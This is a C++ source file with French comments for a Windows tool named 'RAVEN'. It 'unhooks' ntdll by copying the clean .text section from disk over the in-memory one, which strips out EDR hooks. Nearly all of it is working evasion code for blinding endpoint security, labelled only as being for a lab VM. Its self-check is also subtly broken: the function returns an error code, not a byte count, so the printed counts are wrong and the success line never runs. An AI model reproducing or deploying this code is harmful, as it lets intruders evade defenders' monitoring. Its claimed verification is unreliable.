// language: C++17, file: unhook_ntdll.cpp, target: Windows x64 (lab VM)
// UNHOOKING NTDLL : lit ntdll PROPRE depuis le disque, compare le .text avec celui
// en mémoire, restaure les octets hookés par l'EDR. Après ça, tous les appels ntdll
// passent par le code ORIGINAL de Microsoft.
#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <cstdio>
#include <string>

static HANDLE FindNtdllInProcess() {
    HMODULE mods[1024]; DWORD needed;
    HANDLE proc = GetCurrentProcess();
    if (EnumProcessModules(proc, mods, sizeof(mods), &needed)) {
        char name[MAX_PATH];
        for (unsigned i = 0; i < needed / sizeof(HMODULE); i++) {
            GetModuleBaseNameA(proc, mods[i], name, MAX_PATH);
            if (!_stricmp(name, "ntdll.dll")) return mods[i];
        }
    }
    return NULL;
}

// retrouve la section .text dans les headers PE depuis le buffer disque
static bool GetTextSection(BYTE* pe, BYTE** outData, DWORD* outSize) {
    auto dos = (PIMAGE_DOS_HEADER)pe;
    auto nt  = (PIMAGE_NT_HEADERS)(pe + dos->e_lfanew);
    auto sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (!memcmp(sec[i].Name, ".text", 5)) {
            *outData = pe + sec[i].PointerToRawData;
            *outSize = sec[i].SizeOfRawData;
            return true;
        }
    }
    return false;
}

static BYTE* loadedNtdll = NULL;
static DWORD loadedTextSize = 0;

static int Unhook() {
    loadedNtdll = (BYTE*)FindNtdllInProcess();
    if (!loadedNtdll) { printf("[X] ntdll introuvable en mémoire\n"); return 1; }

    auto dos = (PIMAGE_DOS_HEADER)loadedNtdll;
    auto nt  = (PIMAGE_NT_HEADERS)(loadedNtdll + dos->e_lfanew);
    auto sec = IMAGE_FIRST_SECTION(nt);
    DWORD textRVA = 0, textSize = 0;
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (!memcmp(sec[i].Name, ".text", 5)) {
            textRVA = sec[i].VirtualAddress;
            textSize = sec[i].Misc.VirtualSize;
        }
    }
    if (!textRVA) { printf("[X] .text introuvable\n"); return 1; }

    // la copie PROPRE depuis le disque
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ,
                               FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) { printf("[X] ntdll disque illisible\n"); return 1; }
    DWORD sz = GetFileSize(hFile, NULL);
    BYTE* clean = (BYTE*)VirtualAlloc(NULL, sz, MEM_COMMIT, PAGE_READWRITE);
    DWORD rd; ReadFile(hFile, clean, sz, &rd, NULL); CloseHandle(hFile);

    BYTE* cleanText = NULL; DWORD cleanSize = 0;
    GetTextSection(clean, &cleanText, &cleanSize);

    BYTE* memText = loadedNtdll + textRVA;
    DWORD patched = 0;

    // protège la page en RW pour écrire, puis remets RX
    DWORD oldProt;
    VirtualProtect(memText, textSize, PAGE_READWRITE, &oldProt);
    for (DWORD i = 0; i < textSize && i < cleanSize; i++) {
        if (memText[i] != cleanText[i]) {
            memText[i] = cleanText[i];
            patched++;
        }
    }
    VirtualProtect(memText, textSize, PAGE_EXECUTE_READ, &oldProt);
    VirtualFree(clean, 0, MEM_RELEASE);

    printf("[*] octets restaurés (hooks EDR neutralisés) : %lu\n", patched);
    return 0;
}

int main() {
    printf("[*] RAVEN — unhooking ntdll\n");
    int before = Unhook();
    // re-unhook pour prouver : après restauration, plus rien à corriger
    int after = Unhook();
    printf("[*] second passage : %d octets (0 = ntdll est PROPRE, les hooks sont morts)\n", after);
    if (before > 0 && after == 0)
        printf("[OK] ntdll restauré au code original Microsoft — les hooks EDR sont morts\n");
    return 0;
}
